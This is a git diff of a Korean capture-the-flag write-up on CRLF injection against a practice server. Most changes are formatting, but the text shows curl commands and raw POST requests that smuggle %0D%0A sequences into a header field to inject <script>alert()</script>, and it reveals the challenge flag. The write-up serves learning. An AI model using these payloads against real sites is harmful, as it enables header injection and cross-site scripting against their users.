@@ -173,6 +173,8 @@ if response.status_code == 200:
 
 ### index()
 
+---
+
 ```python
 def index():
     if request.method == "POST":
@@ -431,6 +433,8 @@ I't is very g
 
 ### 1-4. 본문에 내용 추가
 
+---
+
 ```bash
 curl -v http://war.knock-on.org:10013/ -d "header=header1: value1%0D%0A%0D%0A<script>alert(123)</script>header2&value=value2"
 
@@ -471,6 +475,8 @@ CRLF를 두 번 추가한 부분부터는 본문으로 인식됨
 
 ### 1-5. /report에 요청
 
+---
+
 ```bash
 curl -v http://war.knock-on.org:10013/report -d "header=header1: value1%0D%0A%0D%0A<script>alert()</script>header2&value=value2"
 
@@ -509,6 +515,8 @@ K0{CRLF_is_very_common_vulnerability}
 
 ### 2-1. post 요청 - header, value
 
+---
+
 ```sh
 POST / HTTP/1.1
 Host: war.knock-on.org:10013
@@ -534,6 +542,8 @@ I't is very good day to walk out. Power thourgh!!!!
 |
 
 ### 2-2. 헤더 두 개 설정
+
+---
 
 ```sh
 POST / HTTP/1.1
@@ -562,6 +572,8 @@ I't is very good day to walk out. Power thourgh!!!!
 |
 
 ### 2-3. 헤더를 본문으로 인식
+
+---
 
 ```sh
 POST / HTTP/1.1
@@ -593,7 +605,9 @@ I't is very good day to walk out. Power thourgh!!!!
 
 ### 2-4. 본문에 내용 추가
 
-```html
+---
+
+```sh
 POST / HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
@@ -625,7 +639,9 @@ I't is very good day to walk out. Power thourgh!!!!
 
 ### 2-5. /report에 요청
 
-```html
+----
+
+```sh
 POST /report HTTP/1.1
 Host: war.knock-on.org:10013
 Content-Type: application/x-www-form-urlencoded
@@ -657,8 +673,29 @@ K0{CRLF_is_very_common_vulnerability}
 
 ## Payload
 
+### 1. curl
+
+---
+
 ```bash
 curl -v http://war.knock-on.org:10013/report -d "header=header:%0d%0a%0D%0A<script>alert(1)</script>&value"
+```
+
+|
+
+### 2. burp suite
+
+---
+
+```bash
+POST /report HTTP/1.1
+Host: war.knock-on.org:10013
+Content-Type: application/x-www-form-urlencoded
+
+header=header1: value1
+
+<script>alert()</script>
+header2&value=value2
 ```
 
 |
